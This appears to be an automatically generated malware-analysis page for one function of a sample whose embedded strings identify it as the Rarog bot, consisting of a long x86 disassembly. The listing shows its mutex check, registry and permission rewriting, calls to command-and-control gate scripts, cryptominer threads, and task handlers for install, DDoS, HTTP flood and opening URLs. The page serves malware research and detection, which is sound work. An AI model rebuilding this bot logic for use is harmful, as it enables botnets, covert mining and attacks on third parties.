---
layout: post
title:  "fcn.00405750 @ 69b3c79878674ea715338a112bb5caa6"
date:   2021-08-30 15:52:19 +0300
categories: report
index: false
---

# Generic Information
- **Function:** fcn.00405750
- **Origin (md5):** 69b3c79878674ea715338a112bb5caa6
- **VirusTotal:** [virustotal.com/gui/file/69b3c79878674ea715338a112bb5caa6][virustotal_ref]

# Code Tags
<span class="tag" id="FILE">FILE</span>
<span class="tag" id="PROCESS">PROCESS</span>
<span class="tag" id="THREAD">THREAD</span>


# Similar Functions

1. [fcn.0041e847][similar_1_ref] (sim.: 0.91629017862883)
2. [fcn.0040becc][similar_2_ref] (sim.: 0.9012598350960291)
3. [fcn.1000a104][similar_3_ref] (sim.: 0.8981763841407223)
4. [fcn.004183a4][similar_4_ref] (sim.: 0.8977726820152792)
5. [fcn.00406b6f][similar_5_ref] (sim.: 0.8974616807350713)


# Disassembled Code

{% highlight nasm %}
push 0x490
mov eax,0x424c87
call fcn.0041ef8f
xor ebx,ebx
push 0x103
lea eax,[ebp-0x117]
push ebx
push eax
mov byte[ebp-0x118],bl
call fcn.00411550
xor eax,eax
inc eax
add esp,0xc
mov dword[0x430ad4],eax
mov dword[0x430ad8],eax
push 0x104
lea eax,[ebp-0x118]
push eax
push ebx
call dword[sym.imp.KERNEL32.dll_GetModuleFileNameA]
push 0xea60
mov dword[ebp-4],ebx
call dword[sym.imp.KERNEL32.dll_Sleep]
lea esi,[ebp-0x1c0]
call fcn.0040933e
mov edi,eax
lea esi,[ebp-0x1dc]
mov byte[ebp-4],1
call fcn.0040933e
push 0x428698
push eax
lea eax,[ebp-0x188]
push eax
mov byte[ebp-4],2
call fcn.004029e3
add esp,0xc
mov ecx,eax
mov eax,edi
lea edi,[ebp-0x16c]
mov byte[ebp-4],3
call fcn.00402a1a
cmp dword[eax+0x14],0x10
jb 0x4057fa
mov eax,dword[eax]
push eax
push ebx
push ebx
call dword[sym.imp.KERNEL32.dll_CreateMutexA]
xor esi,esi
push ebx
inc esi
push esi
lea ecx,[ebp-0x16c]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x188]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x1dc]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x1c0]
mov byte[ebp-4],bl
call fcn.00401cd0
call dword[sym.imp.KERNEL32.dll_GetLastError]
cmp eax,0xb7
jne 0x4059c0
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x480],esp
push 0xf
pop esi
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.Rarog____Error__Bot_is_already_running_in_system__using_ExitProcess__
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x480],esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.____________________________________________________________
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x480],esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.POST
mov byte[ecx],bl
call fcn.00401caf
sub esp,0x1c
mov byte[ebp-4],4
mov eax,esp
mov dword[ebp-0x494],esp
call fcn.00402915
lea ecx,[ebp-0x214]
call fcn.0040a2a1
mov edi,eax
lea esi,[ebp-0x1c0]
mov byte[ebp-4],5
call fcn.0040933e
push eax
lea eax,[ebp-0x1dc]
push 0x428a00
push eax
mov byte[ebp-4],6
call fcn.004029ac
add esp,0xc
push str.emainl
push eax
lea eax,[ebp-0x188]
push eax
mov byte[ebp-4],7
call fcn.004029e3
add esp,0xc
mov ecx,eax
sub esp,0x1c
mov eax,edi
mov byte[ebp-4],8
mov edi,esp
mov dword[ebp-0x494],esp
call fcn.00402a1a
sub esp,0x1c
mov byte[ebp-4],9
mov ecx,esp
mov dword[ebp-0x498],esp
mov dword[ecx+0x14],0xf
mov dword[ecx+0x10],ebx
push str._gate_setOnline.php
mov byte[ecx],bl
call fcn.00401caf
sub esp,0x1c
mov eax,esp
mov dword[ebp-0x48c],esp
mov byte[ebp-4],0xa
push eax
call fcn.0040318d
lea ecx,[ebp-0x16c]
mov byte[ebp-4],0xe
call fcn.00401626
xor esi,esi
push ebx
inc esi
push esi
lea ecx,[ebp-0x16c]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x188]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x1dc]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x1c0]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x214]
call fcn.00401cd0
push ebx
call dword[sym.imp.KERNEL32.dll_ExitProcess]
call fcn.00409a55
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x480],esp
push 0xf
pop esi
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.Rarog___Rewriting_registry_value
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
call dword[sym.imp.KERNEL32.dll_GetCurrentProcessId]
push eax
call fcn.0040a24f
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x480],esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.Rarog___Rewriting_DACL
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x480],esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.POST
mov byte[ecx],bl
call fcn.00401caf
sub esp,0x1c
mov byte[ebp-4],0xf
mov ecx,esp
mov dword[ebp-0x494],esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push 0x4282a0
mov byte[ecx],bl
call fcn.00401caf
sub esp,0x1c
mov byte[ebp-4],0x10
mov ecx,esp
mov dword[ebp-0x498],esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str._gate_checkConnection.php
mov byte[ecx],bl
call fcn.00401caf
sub esp,0x1c
mov eax,esp
mov dword[ebp-0x48c],esp
push eax
mov byte[ebp-4],0x11
call fcn.0040318d
lea ecx,[ebp-0x32c]
mov byte[ebp-4],bl
call fcn.00401626
push str.success
sub esp,0x1c
mov byte[ebp-4],0x12
lea eax,[ebp-0x32c]
mov esi,esp
mov dword[ebp-0x480],esp
push eax
call fcn.004026e3
lea edi,[ebp-0x16c]
call fcn.0040a341
mov edx,eax
mov byte[ebp-4],0x13
call fcn.00408c1b
pop ecx
push ebx
push 1
mov ecx,edi
mov byte[ebp-0x48d],al
mov byte[ebp-4],0x12
call fcn.00401cd0
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x480],esp
mov dword[ecx+0x10],ebx
cmp byte[ebp-0x48d],bl
je 0x405b37
mov dword[ecx+0x14],0xf
push str.Rarog___checkConnection_request_failed__using_Sleep_600000_
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
push 0x927c0
call dword[sym.imp.KERNEL32.dll_Sleep]
push ebx
push 1
lea ecx,[ebp-0x32c]
mov byte[ebp-4],bl
call fcn.00401cd0
push 0xf
pop esi
jmp 0x405a18
push 0xf
pop esi
mov dword[ecx+0x14],esi
push str.Rarog___Successful_connected_to_server
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x480],esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.POST
mov byte[ecx],bl
call fcn.00401caf
lea esi,[ebp-0x16c]
mov byte[ebp-4],0x14
call fcn.0040933e
sub esp,0x1c
mov ecx,esp
mov byte[ebp-4],0x15
mov dword[ebp-0x494],esp
push eax
push 0x428a00
push ecx
call fcn.004029ac
add esp,0xc
sub esp,0x1c
mov byte[ebp-4],0x16
mov ecx,esp
mov dword[ebp-0x498],esp
mov dword[ecx+0x14],0xf
mov dword[ecx+0x10],ebx
push str._gate_check.php
mov byte[ecx],bl
call fcn.00401caf
sub esp,0x1c
mov eax,esp
mov dword[ebp-0x48c],esp
push eax
mov byte[ebp-4],0x17
call fcn.0040318d
lea ecx,[ebp-0x40c]
mov byte[ebp-4],0x18
call fcn.00401626
push ebx
push 1
mov ecx,esi
mov byte[ebp-4],0x1a
call fcn.00401cd0
push str.success
sub esp,0x1c
lea eax,[ebp-0x40c]
mov esi,esp
mov dword[ebp-0x480],esp
push eax
call fcn.004026e3
lea edi,[ebp-0x188]
call fcn.0040a341
mov edx,eax
mov byte[ebp-4],0x1b
call fcn.00408c1b
pop ecx
push ebx
push 1
mov ecx,edi
mov byte[ebp-0x48d],al
mov byte[ebp-4],0x1a
call fcn.00401cd0
cmp byte[ebp-0x48d],bl
je 0x406087
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x480],esp
push 0xf
pop esi
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.Rarog___Bot_not_registered__send_request
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x488],esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.POST
mov byte[ecx],bl
call fcn.00401caf
lea esi,[ebp-0x2a0]
mov byte[ebp-4],0x1c
call fcn.00409711
mov dword[ebp-0x480],eax
lea ebx,[ebp-0x268]
mov byte[ebp-4],0x1d
call fcn.00409483
mov dword[ebp-0x494],eax
lea esi,[ebp-0x2f4]
mov byte[ebp-4],0x1e
call fcn.00409528
mov dword[ebp-0x498],eax
lea esi,[ebp-0x2bc]
mov byte[ebp-4],0x1f
call fcn.004096c6
mov dword[ebp-0x490],eax
lea esi,[ebp-0x2d8]
mov byte[ebp-4],0x20
call fcn.004095f7
mov dword[ebp-0x484],eax
lea esi,[ebp-0x3b8]
mov byte[ebp-4],0x21
call fcn.004031ef
mov dword[ebp-0x48c],eax
lea esi,[ebp-0x47c]
mov byte[ebp-4],0x22
call fcn.00403214
mov ebx,eax
lea esi,[ebp-0x444]
mov byte[ebp-4],0x23
call fcn.0040940d
mov edi,eax
lea esi,[ebp-0x364]
mov byte[ebp-4],0x24
call fcn.0040933e
push eax
lea eax,[ebp-0x348]
push 0x428a00
push eax
mov byte[ebp-4],0x25
call fcn.004029ac
add esp,0xc
push 0x4291c0
push eax
lea eax,[ebp-0x3d4]
push eax
mov byte[ebp-4],0x26
call fcn.004029e3
add esp,0xc
mov ecx,eax
mov eax,edi
lea edi,[ebp-0x380]
mov byte[ebp-4],0x27
call fcn.00402a1a
push 0x4291bc
push eax
lea eax,[ebp-0x460]
push eax
mov byte[ebp-4],0x28
call fcn.004029e3
add esp,0xc
mov ecx,eax
mov eax,ebx
lea edi,[ebp-0x3f0]
mov byte[ebp-4],0x29
call fcn.00402a1a
push 0x4291b8
push eax
lea eax,[ebp-0x428]
push eax
mov byte[ebp-4],0x2a
call fcn.004029e3
add esp,0xc
mov ecx,eax
mov eax,dword[ebp-0x48c]
lea edi,[ebp-0x39c]
mov byte[ebp-4],0x2b
call fcn.00402a1a
push str.os
push eax
lea eax,[ebp-0x134]
push eax
mov byte[ebp-4],0x2c
call fcn.004029e3
add esp,0xc
mov ecx,eax
mov eax,dword[ebp-0x484]
lea edi,[ebp-0x150]
mov byte[ebp-4],0x2d
call fcn.00402a1a
push str.bit
push eax
lea eax,[ebp-0x1a4]
push eax
mov byte[ebp-4],0x2e
call fcn.004029e3
add esp,0xc
mov ecx,eax
mov byte[ebp-4],0x2f
mov eax,dword[ebp-0x490]
lea edi,[ebp-0x1f8]
call fcn.00402a1a
push str.proc
push eax
lea eax,[ebp-0x24c]
push eax
mov byte[ebp-4],0x30
call fcn.004029e3
add esp,0xc
mov ecx,eax
mov byte[ebp-4],0x31
mov eax,dword[ebp-0x498]
lea edi,[ebp-0x230]
call fcn.00402a1a
push str.video
push eax
lea eax,[ebp-0x284]
push eax
mov byte[ebp-4],0x32
call fcn.004029e3
add esp,0xc
mov ecx,eax
mov byte[ebp-4],0x33
mov eax,dword[ebp-0x494]
lea edi,[ebp-0x214]
call fcn.00402a1a
push str.av
push eax
lea eax,[ebp-0x1c0]
push eax
mov byte[ebp-4],0x34
call fcn.004029e3
add esp,0xc
mov ecx,eax
mov byte[ebp-4],0x35
mov eax,dword[ebp-0x480]
lea edi,[ebp-0x1dc]
call fcn.00402a1a
sub esp,0x1c
mov esi,eax
mov byte[ebp-4],0x36
mov eax,esp
mov dword[ebp-0x480],esp
call fcn.00401b7c
sub esp,0x1c
mov byte[ebp-4],0x37
mov ecx,esp
xor ebx,ebx
mov dword[ebp-0x494],esp
mov dword[ecx+0x14],0xf
mov dword[ecx+0x10],ebx
push str._gate_reg.php
mov byte[ecx],bl
call fcn.00401caf
sub esp,0x1c
mov byte[ebp-4],0x38
mov eax,esp
mov dword[ebp-0x498],esp
push eax
call fcn.0040318d
lea ecx,[ebp-0x188]
mov byte[ebp-4],0x52
call fcn.00401626
xor esi,esi
push ebx
inc esi
push esi
lea ecx,[ebp-0x188]
call fcn.00401cd0
push ebx
push esi
mov ecx,edi
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x1c0]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x214]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x284]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x230]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x24c]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x1f8]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x1a4]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x150]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x134]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x39c]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x428]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x3f0]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x460]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x380]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x3d4]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x348]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x364]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x444]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x47c]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x3b8]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x2d8]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x2bc]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x2f4]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x268]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x2a0]
mov byte[ebp-4],0x1a
call fcn.00401cd0
sub esp,0x1c
mov dword[ebp-0x488],esp
mov edi,esp
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x488],esp
mov dword[ecx+0x14],0xf
mov dword[ecx+0x10],ebx
push str.POST
mov byte[ecx],bl
call fcn.00401caf
lea esi,[ebp-0x2a0]
mov byte[ebp-4],0x53
call fcn.0040933e
sub esp,0x1c
mov ecx,esp
mov byte[ebp-4],0x54
mov dword[ebp-0x480],esp
push eax
push 0x428a00
push ecx
call fcn.004029ac
add esp,0xc
sub esp,0x1c
mov byte[ebp-4],0x55
mov ecx,esp
mov dword[ebp-0x494],esp
mov dword[ecx+0x14],0xf
mov dword[ecx+0x10],ebx
push str._gate_modules.php
mov byte[ecx],bl
call fcn.00401caf
sub esp,0x1c
mov byte[ebp-4],0x56
mov eax,esp
mov dword[ebp-0x498],esp
push eax
call fcn.0040318d
mov ecx,edi
mov byte[ebp-4],0x57
call fcn.00401626
lea edi,[ebp-0x310]
call fcn.0040a341
xor edi,edi
push ebx
inc edi
push edi
mov ecx,esi
mov byte[ebp-4],0x59
call fcn.00401cd0
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x488],esp
push 0xf
pop esi
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.Rarog___Successful_download_modules_script__decode...
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
cmp dword[ebp-0x2fc],0x10
push 0x3b
pop eax
mov word[ebp-0x49c],ax
mov eax,dword[ebp-0x310]
jae 0x406184
lea eax,[ebp-0x310]
lea ecx,[ebp-0x49c]
push ecx
push eax
call fcn.0040e0c0
pop ecx
pop ecx
mov dword[ebp-0x484],edi
mov dword[ebp-0x48c],ebx
mov dword[ebp-0x490],ebx
mov dword[0x430ae4],edi
cmp eax,ebx
je 0x406229
mov ecx,dword[ebp-0x484]
dec ecx
je 0x4061f5
dec ecx
je 0x4061d9
dec ecx
je 0x40620f
dec ecx
jne 0x40620f
mov esi,eax
push 2
mov edi,0x4283ec
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x40620f
mov dword[0x430ae4],ebx
jmp 0x40620f
mov esi,eax
push 2
mov edi,0x428690
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x40620f
mov dword[ebp-0x490],1
jmp 0x40620f
mov esi,eax
push 2
mov edi,0x428690
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x40620f
mov dword[ebp-0x48c],1
lea eax,[ebp-0x49c]
push eax
push ebx
call fcn.0040e0c0
inc dword[ebp-0x484]
pop ecx
pop ecx
push 0xf
pop esi
jmp 0x4061ab
cmp dword[ebp-0x48c],ebx
je 0x406263
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x488],esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.Rarog___CPU_module_active__start_CPUMinerThread__
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
push ebx
push ebx
push ebx
push 0x40410e
push ebx
push ebx
call dword[sym.imp.KERNEL32.dll_CreateThread]
cmp dword[ebp-0x490],ebx
je 0x40629d
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x488],esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.Rarog___GPU_module_active__start_GPUMinerThread__
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
push ebx
push ebx
push ebx
push 0x40515c
push ebx
push ebx
call dword[sym.imp.KERNEL32.dll_CreateThread]
sub esp,0x1c
mov dword[ebp-0x488],esp
mov dword[ebp-0x480],esp
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x488],esp
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.POST
mov byte[ecx],bl
call fcn.00401caf
sub esp,0x1c
mov byte[ebp-4],0x5a
mov eax,esp
mov dword[ebp-0x494],esp
call fcn.00402915
lea ecx,[ebp-0x2d8]
call fcn.0040a2a1
mov edi,eax
lea esi,[ebp-0x2bc]
mov byte[ebp-4],0x5b
call fcn.0040933e
push eax
lea eax,[ebp-0x2f4]
push 0x428a00
push eax
mov byte[ebp-4],0x5c
call fcn.004029ac
add esp,0xc
push 0x429288
push eax
lea eax,[ebp-0x268]
push eax
mov byte[ebp-4],0x5d
call fcn.004029e3
add esp,0xc
mov ecx,eax
sub esp,0x1c
mov eax,edi
mov byte[ebp-4],0x5e
mov edi,esp
mov dword[ebp-0x494],esp
call fcn.00402a1a
sub esp,0x1c
mov ecx,esp
mov byte[ebp-4],0x5f
mov dword[ebp-0x498],esp
push 0xf
pop esi
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str._gate_setOnline.php
mov byte[ecx],bl
call fcn.00401caf
sub esp,0x1c
mov eax,esp
mov dword[ebp-0x48c],esp
push eax
mov byte[ebp-4],0x60
call fcn.0040318d
mov ecx,dword[ebp-0x480]
mov byte[ebp-4],0x64
call fcn.00401626
lea edi,[ebp-0x16c]
call fcn.0040a341
xor edi,edi
push ebx
inc edi
push edi
lea ecx,[ebp-0x268]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x2f4]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x2bc]
call fcn.00401cd0
push ebx
push edi
lea ecx,[ebp-0x2d8]
call fcn.00401cd0
mov dword[ebp-0x120],esi
mov dword[ebp-0x124],ebx
mov byte[ebp-0x134],bl
mov dword[ebp-0x1ac],esi
mov dword[ebp-0x1b0],ebx
mov byte[ebp-0x1c0],bl
mov dword[ebp-0x13c],esi
mov dword[ebp-0x140],ebx
mov byte[ebp-0x150],bl
mov dword[ebp-0x190],esi
mov dword[ebp-0x194],ebx
mov byte[ebp-0x1a4],bl
mov dword[ebp-0x174],esi
mov dword[ebp-0x178],ebx
mov byte[ebp-0x188],bl
mov dword[ebp-0x1e4],esi
mov dword[ebp-0x1e8],ebx
mov byte[ebp-0x1f8],bl
mov dword[ebp-0x200],esi
mov dword[ebp-0x204],ebx
mov byte[ebp-0x214],bl
mov dword[ebp-0x270],esi
mov dword[ebp-0x274],ebx
mov byte[ebp-0x284],bl
mov dword[ebp-0x21c],esi
mov dword[ebp-0x220],ebx
mov byte[ebp-0x230],bl
push 0x3b
mov byte[ebp-4],0x72
cmp dword[ebp-0x158],0x10
pop eax
mov word[ebp-0x490],ax
mov eax,dword[ebp-0x16c]
jae 0x406492
lea eax,[ebp-0x16c]
lea ecx,[ebp-0x490]
push ecx
push eax
call fcn.0040e0c0
mov dword[ebp-0x48c],edi
pop ecx
mov dword[ebp-0x484],eax
pop ecx
cmp eax,ebx
je 0x406690
mov eax,dword[ebp-0x48c]
dec eax
je 0x406667
dec eax
je 0x4065a0
dec eax
je 0x40653a
dec eax
je 0x406508
dec eax
jne 0x406678
cmp dword[ebp-0x120],0x10
mov esi,dword[ebp-0x134]
jae 0x4064eb
lea esi,[ebp-0x134]
push 8
mov edi,str.install
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x406678
lea ecx,[ebp-0x188]
jmp 0x40666d
cmp dword[ebp-0x120],0x10
mov esi,dword[ebp-0x134]
jae 0x40651d
lea esi,[ebp-0x134]
push 8
mov edi,str.install
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x406678
lea ecx,[ebp-0x1a4]
jmp 0x40666d
cmp dword[ebp-0x120],0x10
mov esi,dword[ebp-0x134]
jae 0x40654f
lea esi,[ebp-0x134]
push 8
mov edi,str.install
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x40656e
push dword[ebp-0x484]
lea ecx,[ebp-0x150]
call fcn.00401caf
cmp dword[ebp-0x120],0x10
mov esi,dword[ebp-0x134]
jae 0x406583
lea esi,[ebp-0x134]
push 5
mov edi,str.ddos
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x406678
lea ecx,[ebp-0x214]
jmp 0x40666d
cmp dword[ebp-0x120],0x10
mov esi,dword[ebp-0x134]
jae 0x4065b5
lea esi,[ebp-0x134]
push 8
mov edi,str.install
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x4065d4
push dword[ebp-0x484]
lea ecx,[ebp-0x1c0]
call fcn.00401caf
cmp dword[ebp-0x120],0x10
mov esi,dword[ebp-0x134]
jae 0x4065e9
lea esi,[ebp-0x134]
push 5
mov edi,str.ddos
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x406608
push dword[ebp-0x484]
lea ecx,[ebp-0x1f8]
call fcn.00401caf
cmp dword[ebp-0x120],0x10
mov esi,dword[ebp-0x134]
jae 0x40661d
lea esi,[ebp-0x134]
push 0xb
mov edi,str.http_flood
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x40663c
push dword[ebp-0x484]
lea ecx,[ebp-0x284]
call fcn.00401caf
cmp dword[ebp-0x120],0x10
mov esi,dword[ebp-0x134]
jae 0x406651
lea esi,[ebp-0x134]
push 9
mov edi,str.open_url
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x406678
lea ecx,[ebp-0x230]
jmp 0x40666d
lea ecx,[ebp-0x134]
push dword[ebp-0x484]
call fcn.00401caf
lea eax,[ebp-0x490]
push eax
push ebx
call fcn.0040e0c0
inc dword[ebp-0x48c]
jmp 0x4064a5
cmp dword[ebp-0x120],0x10
mov esi,dword[ebp-0x134]
jae 0x4066a5
lea esi,[ebp-0x134]
push 8
mov edi,str.install
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x406796
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x488],esp
mov dword[ecx+0x14],0xf
mov dword[ecx+0x10],ebx
push str.Rarog___New_task__type:_install
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
sub esp,0x1c
lea eax,[ebp-0x150]
mov esi,esp
mov dword[ebp-0x488],esp
push eax
call fcn.004026e3
sub esp,0x1c
mov byte[ebp-4],0x73
lea eax,[ebp-0x1c0]
mov esi,esp
mov dword[ebp-0x480],esp
push eax
call fcn.004026e3
mov byte[ebp-4],0x72
call fcn.004018e2
cmp dword[ebp-0x190],0x10
mov esi,dword[ebp-0x1a4]
jae 0x40672d
lea esi,[ebp-0x1a4]
push 6
mov edi,str.start
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x406796
cmp dword[ebp-0x190],0x10
mov esi,dword[ebp-0x1a4]
jae 0x406750
lea esi,[ebp-0x1a4]
push 5
xor eax,eax
mov eax,dword[ebp-0x150]
mov edi,str.hide
pop ecx
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x406776
cmp dword[ebp-0x13c],0x10
jae 0x406773
lea eax,[ebp-0x150]
push ebx
jmp 0x406787
cmp dword[ebp-0x13c],0x10
jae 0x406785
lea eax,[ebp-0x150]
push 5
push ebx
push 0x4282a0
push eax
push ebx
push ebx
call dword[sym.imp.SHELL32.dll_ShellExecuteA]
cmp dword[ebp-0x120],0x10
mov esi,dword[ebp-0x134]
jae 0x4067ab
lea esi,[ebp-0x134]
push 5
mov edi,str.ddos
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x406807
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x488],esp
mov dword[ecx+0x14],0xf
mov dword[ecx+0x10],ebx
push str.Rarog___New_task__type:_ddos
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
cmp dword[ebp-0x1e4],0x10
mov esi,dword[ebp-0x1f8]
jae 0x4067f4
lea esi,[ebp-0x1f8]
lea eax,[ebp-0x214]
call fcn.0040312c
push eax
mov ecx,esi
call fcn.0040109d
cmp dword[ebp-0x120],0x10
mov esi,dword[ebp-0x134]
jae 0x40681c
lea esi,[ebp-0x134]
push 0xb
mov edi,str.http_flood
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x40686c
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x488],esp
mov dword[ecx+0x14],0xf
mov dword[ecx+0x10],ebx
push str.Rarog___New_task__type:_http_flood
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
sub esp,0x1c
lea eax,[ebp-0x284]
mov esi,esp
mov dword[ebp-0x488],esp
push eax
call fcn.004026e3
call fcn.0040261f
cmp dword[ebp-0x120],0x10
mov esi,dword[ebp-0x134]
jae 0x406881
lea esi,[ebp-0x134]
push 9
mov edi,str.open_url
pop ecx
xor eax,eax
repe cmpsb byte[esi],byte ptr es:[edi]
jne 0x406961
sub esp,0x1c
mov ecx,esp
mov dword[ebp-0x488],esp
push 0xf
pop esi
mov dword[ecx+0x14],esi
mov dword[ecx+0x10],ebx
push str.Rarog___New_task__type:_open_url
mov byte[ecx],bl
call fcn.00401caf
call fcn.0040284c
lea eax,[ebp-0x1dc]
push str._c_start_
push eax
lea edi,[ebp-0x230]
call fcn.00408c43
pop ecx
pop ecx
mov byte[ebp-4],0x74
cmp dword[ebp-0x1c8],0x10
mov eax,dword[ebp-0x1dc]
jae 0x4068ea
lea eax,[ebp-0x1dc]
push eax
lea ecx,[ebp-0x24c]
mov dword[ebp-0x238],esi
mov dword[ebp-0x23c],ebx
mov byte[ebp-0x24c],bl
call fcn.00401caf
lea eax,[ebp-0x268]
push eax
lea ecx,[ebp-0x24c]
mov byte[ebp-4],0x75
call fcn.00409f8f
cmp dword[eax+0x14],8
jb 0x406926
mov eax,dword[eax]
push ebx
push ebx
push eax
push str.C:WindowsSystem32cmd.exe
push ebx
push ebx
call dword[sym.imp.SHELL32.dll_ShellExecuteW]
push 1
xor edi,edi
lea esi,[ebp-0x268]
call fcn.00401e8b
push ebx
push 1
lea ecx,[ebp-0x24c]
call fcn.00401cd0
push ebx
push 1
lea ecx,[ebp-0x1dc]
call fcn.00401cd0
push 0xea60
call dword[sym.imp.KERNEL32.dll_Sleep]
xor esi,esi
push ebx
inc esi
push esi
lea ecx,[ebp-0x230]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x284]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x214]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x1f8]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x188]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x1a4]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x150]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x1c0]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x134]
call fcn.00401cd0
push ebx
push esi
lea ecx,[ebp-0x16c]
mov byte[ebp-4],0x59
call fcn.00401cd0
push 0xf
pop esi
jmp 0x40629d
{% endhighlight %}


